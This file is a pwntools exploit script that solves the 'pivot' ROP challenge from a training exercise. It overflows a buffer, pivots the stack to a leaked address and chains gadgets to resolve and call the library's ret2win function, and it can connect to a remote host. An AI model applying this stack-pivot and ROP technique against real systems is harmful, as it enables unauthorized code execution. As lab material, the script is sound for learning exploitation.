from pwn import *

"""
Sources:
https://bananamafia.dev/post/binary-rop-stackpivot/
"""

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./pivot")
lib = ELF("./libpivot.so")


class ROP_Gadget:
    xchg = 0x00000000004009bd
    pop_rax = 0x00000000004009bb
    foothold_i = 0x0000000000400720
    foothold_plt = elf.plt["foothold_function"]
    foothold_got = elf.got["foothold_function"]
    rtw_offset = lib.symbols["ret2win"] - lib.symbols["foothold_function"]
    pop_rbp = 0x00000000004007c8
    add_rax_rbp = 0x00000000004009c4
    deref_eax = 0x00000000004009c0 # mov eax, dword ptr [rax]; ret
    call_rax = 0x00000000004006b0


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(40)
    input("PAUSE...")

    io.recvuntil(b"pivot: ")
    pivot_str = io.recvuntil(b"\n")
    pivot_addr = int(pivot_str, 16)

    log.info("Pivot address: {}".format(hex(pivot_addr)))

    stager = [
        padding,
        ROP_Gadget.pop_rax,
        pivot_addr,
        ROP_Gadget.xchg
    ]

    payload = [
        ROP_Gadget.foothold_plt,
        ROP_Gadget.pop_rax,
        ROP_Gadget.foothold_got,
        ROP_Gadget.deref_eax,
        ROP_Gadget.pop_rbp,
        ROP_Gadget.rtw_offset,
        ROP_Gadget.add_rax_rbp,
        ROP_Gadget.call_rax
    ]

    io.sendline(flat(payload))
    io.sendline(flat(stager))
    io.interactive()


if __name__ == "__main__":
    solve()